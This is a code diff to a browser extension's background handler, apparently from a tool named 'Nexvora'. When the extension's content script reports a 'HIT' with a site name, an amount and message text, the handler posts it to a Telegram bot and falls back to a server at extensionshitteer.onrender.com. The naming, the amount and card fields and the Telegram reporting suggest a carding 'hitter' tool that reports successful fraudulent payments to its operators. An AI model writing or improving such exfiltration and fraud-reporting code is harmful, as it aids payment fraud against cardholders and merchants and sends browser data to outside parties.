@@ -11,37 +11,32 @@
     chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
         if (request.type === 'NOTIFY_HIT') {
             const data = request.data || {};
-            (async () => {
-                let success = false;
-                let errorDetails = "";
+            console.log("[Nexvora] 📥 Received HIT from content script:", data.site);
 
-                // Attempt 1: Direct Telegram
+            (async () => {
+                let status = { tg: false, server: false, error: "" };
+
+                // Attempt 1: Direct Telegram Bot API
                 try {
-                    const messageText = data.text || "🟢 <b>HIT DETECTED</b>";
                     const tgRes = await fetch(`https://api.telegram.org/bot${_NEX_V12_TOKEN_}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: _NEX_V12_GROUP_,
-                            text: messageText,
-                            parse_mode: 'HTML',
-                            reply_markup: {
-                                inline_keyboard: [[{ text: "🚀 Open Bot", url: "https://t.me/hitinfobdrobot" }]]
-                            }
+                            text: data.text || "🟢 HIT DETECTED",
+                            parse_mode: 'HTML'
                         })
                     });
                     const tgData = await tgRes.json();
-                    if (tgData.ok) {
-                        success = true;
-                    } else {
-                        errorDetails = "TG: " + (tgData.description || "Unknown");
-                    }
+                    status.tg = tgData.ok;
+                    if (!tgData.ok) status.error = "TG: " + tgData.description;
                 } catch (err) {
-                    errorDetails = "Local: " + err.message;
+                    status.error = "Local Fetch Fail: " + err.message;
                 }
 
-                // Attempt 2: Server Fallback
-                if (!success) {
+                // Attempt 2: Server Fallback (Render)
+                if (!status.tg) {
+                    console.log("[Nexvora] ⚠️ Direct TG failed. Trying Server Fallback...");
                     try {
                         const serverRes = await fetch(`https://extensionshitteer.onrender.com/api/notify-hit`, {
                             method: 'POST',
@@ -49,19 +44,20 @@
                             body: JSON.stringify({
                                 amount: data.amount || 'N/A',
                                 site_name: data.site || 'Unknown',
-                                user_chat_id: '999999',
-                                gateway: 'Extension Fallback'
+                                card: 'REDACTED', // Never send real card
+                                gateway: 'Extension (Failsafe)'
                             })
                         });
                         const sData = await serverRes.json();
-                        if (sData.ok) success = true;
-                        else errorDetails += " | Server Fail";
+                        status.server = sData.ok || sData.success;
+                        if (!status.server) status.error += " | Server Fail";
                     } catch (err) {
-                        errorDetails += " | Network Fail";
+                        status.error += " | Net Fail: " + err.message;
                     }
                 }
 
-                sendResponse({ ok: success, details: errorDetails });
+                console.log("[Nexvora] 🏁 Transmission Completed. TG:", status.tg, "Server:", status.server);
+                sendResponse({ ok: status.tg || status.server, details: status.error });
             })();
             return true; 
         }
